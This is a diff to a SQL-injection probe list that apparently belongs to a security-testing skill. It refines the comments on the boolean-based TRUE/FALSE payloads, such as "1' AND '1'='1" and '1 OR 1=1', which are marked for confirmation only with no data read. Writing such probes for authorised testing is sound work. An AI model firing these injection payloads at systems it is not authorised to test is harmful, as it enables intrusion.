@@ -127,11 +127,16 @@
 # --- Boolean-based (when a meaningful differential is available) ------------
 # Adapt the seed and quote/parenthesis/prefix/suffix to observed context per
 # SKILL.md 2a. These are not drop-in LIKE-pattern probes: a trailing wildcard can
-# change an equality's truth value. Equal responses are inconclusive for this pair.
-1 AND 1=1                  # purpose: boolean TRUE, numeric context | applies: should behave like baseline if injectable and the app is filtering rows | limit: confirmation only, no data read
-1 AND 1=2                  # purpose: boolean FALSE, numeric context | applies: should differ from baseline/TRUE if injectable | limit: confirmation only, no data read
-1' AND '1'='1              # purpose: boolean TRUE, quoted-string context | applies: use when parameter is rendered inside quotes | limit: confirmation only, no data read
-1' AND '1'='2              # purpose: boolean FALSE, quoted-string context | applies: pairs with the TRUE variant above | limit: confirmation only, no data read
+# change an equality's truth value. If compatibility is unresolved, check intended
+# TRUE preserves the known benign marker before dependent FALSE; do not batch them.
+# Being inside quotes is insufficient: prefix/suffix, grouping, parentheses,
+# wildcards or comments can invalidate the predicate or its intended truth value.
+# Equal empty/error responses are inconclusive, not SQLi absence; reassess the
+# context/oracle if TRUE loses the marker. Reuse suitable existing observations.
+1 AND 1=1                  # purpose: intended TRUE, numeric expression | applies: known matching seed, compatible AND row filter and surrounding grouping; should preserve benign marker | limit: missing marker requires oracle reassessment, no data read
+1 AND 1=2                  # purpose: intended FALSE in the same numeric shape | applies: compatible TRUE established; should exclude its marker | limit: equal empties/errors leave comparison unresolved, no data read
+1' AND '1'='1              # purpose: intended TRUE, quoted-string breakout | applies: known match, balanced surrounding SQL with suffix preserving equality; quotes alone are insufficient | limit: TRUE must preserve benign marker; trailing wildcard can invalidate equality, no data read
+1' AND '1'='2              # purpose: intended FALSE in the same quoted shape | applies: compatible TRUE established; should exclude its marker with unchanged prefix/suffix | limit: equal responses with unestablished TRUE are inconclusive, no data read
 1 OR 1=1                   # purpose: alternate intended TRUE form | applies: evidence supports an OR-compatible context/oracle; AND failure alone is insufficient | limit: confirmation only, no data read
 
 # --- Time-based, per engine (pick ONE engine per "Engine identification") ---
